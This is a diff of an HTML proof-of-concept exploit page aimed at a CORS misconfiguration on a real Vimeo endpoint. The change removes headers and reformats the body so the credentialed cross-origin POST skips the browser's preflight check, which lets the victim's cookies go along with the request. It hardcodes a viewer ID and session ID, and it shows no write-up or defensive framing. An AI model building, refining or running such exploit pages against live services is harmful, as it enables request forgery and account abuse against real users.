@@ -1,11 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Vimeo CORS PoC</title>
+  <title>Vimeo CORS PoC (No Preflight)</title>
 </head>
 <body>
-  <h1>Vimeo CORS Misconfiguration PoC</h1>
-  <p>If this works, victim’s browser will send their cookies to Vimeo and we’ll see the response here:</p>
+  <h1>Vimeo CORS Misconfiguration PoC (Simple Request)</h1>
   <pre id="output">Waiting...</pre>
 
   <script>
@@ -13,16 +12,9 @@
       try {
         const resp = await fetch("https://arclight.vimeo.com/add/player-stats?beacon=1&session-id=ee5275ad972ec12f2849f06e704a09b60c4cea741755882610", {
           method: "POST",
-          credentials: "include",  // include victim’s cookies
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify([{
-            "autoplay": false,
-            "viewer_id": 244943635,
-            "session_id": "ee5275ad972ec12f2849f06e704a09b60c4cea741755882610",
-            "name": "cors-poc"
-          }])
+          credentials: "include", // include victim cookies
+          // ❌ no headers that cause preflight
+          body: '[{"autoplay":true,"viewer_id":244943635,"name":"cors-nopreflight"}]'
         });
 
         const text = await resp.text();
